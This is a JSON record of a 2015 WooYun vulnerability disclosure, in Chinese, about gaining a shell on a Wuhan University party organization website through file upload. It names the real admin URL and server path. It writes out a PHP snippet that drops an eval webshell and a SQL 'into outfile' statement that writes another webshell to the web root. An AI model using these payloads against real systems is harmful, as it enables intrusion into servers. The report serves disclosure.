{"id": 40721, "wybug_id": "wooyun-2015-090985", "wybug_title": "武汉大学党委组织部、党校主站getshell", "wybug_corp": "武汉大学", "wybug_author": "WEAINE", "wybug_date": "2015-01-13 10:54", "wybug_open_date": "2015-02-27 10:56", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传内容未检查", "文件上传漏洞", "文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-27：\t细节向公众公开  简要描述： getshell 详细说明：  后台是http://zzb.whu.edu.cn/e/admin/，虽然不是什么标准的弱口令，但我还是猜出来了，你们猜猜看。进入后台以后，首先模板管理-增加自定义模板这里可以在任意位置创建php页面并执行，不过如果在这里造马总是提交不成。类似于图片上传、下载文件上传这里都把后缀php加进黑名单了，同时又自动改名。把马改成.jpg传上去，再去模板管理那里include进去，又提交不成。然后去系统设置-管理数据表与系统模型-管理数据表这里，选一个管理系统模型，再在新页面里选导入系统模型，来到http://zzb.whu.edu.cn/e/admin/db/LoadInM.php，这里可以传后缀.mod的文件，建一个文件写入\n<?fputs(fopen(\"x.php\",\"w\"),\"<?eval(\\$_POST[cmd]);?>\")?>\n保存成xxx.php.mod传上去，会让提示你没选数据表，其实已经传上去了。\n<form action=\"../ecmsmod.php\" method=\"post\" enctype=\"multipart/form-data\" name=\"form1\" onsubmit=\"return confirm('确认要导入?');\">  <table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"3\" cellspacing=\"1\" class=\"tableborder\">    <tr>       <td height=\"25\" colspan=\"2\" class=\"header\">导入系统模型</td>    </tr>    <tr>       <td width=\"28%\" height=\"25\" bgcolor=\"#FFFFFF\">存放的数据表名:</td>      <td width=\"72%\" height=\"25\" bgcolor=\"#FFFFFF\"><strong>zzb_ecms_</strong>         <input name=\"tbname\" type=\"text\" id=\"tbname\">      </td>    </tr>    <tr>       <td height=\"25\" bgcolor=\"#FFFFFF\">选择导入模型文件:</td>      <td height=\"25\" bgcolor=\"#FFFFFF\"><input type=\"file\" name=\"file\">        *.mod</td>    </tr>    <tr>       <td height=\"25\" bgcolor=\"#FFFFFF\">&nbsp;</td>      <td height=\"25\" bgcolor=\"#FFFFFF\"> <input type=\"submit\" name=\"Submit\" value=\"马上导入\">         <input type=\"reset\" name=\"Submit2\" value=\"重置\">        <input name=\"enews\" type=\"hidden\" id=\"enews\" value=\"LoadInMod\">      </td>    </tr>  </table></form>\n看源码可以知道x.php建在了ecmsmod.php同目录。再去系统设置-备份与恢复数据-执行SQL语句这里，执行\ncreate table x (xx text not null);insert into x (xx) values('<?php eval($_POST[xxx])?>');select cmd from temp into outfile ' D:/EmpireServer/newweb/xxxx.php';drop table if exists x;\nD:/EmpireServer/newweb/是它网站根目录，这样就在根目录建了个xxxx.php，菜刀连就好了。   漏洞证明：  \n\n   修复方案：  不如不用这么屌的后台。\n\n   版权声明：转载请注明来源 WEAINE@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-01-16 16:58 厂商回复： 正在通知相关学校处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}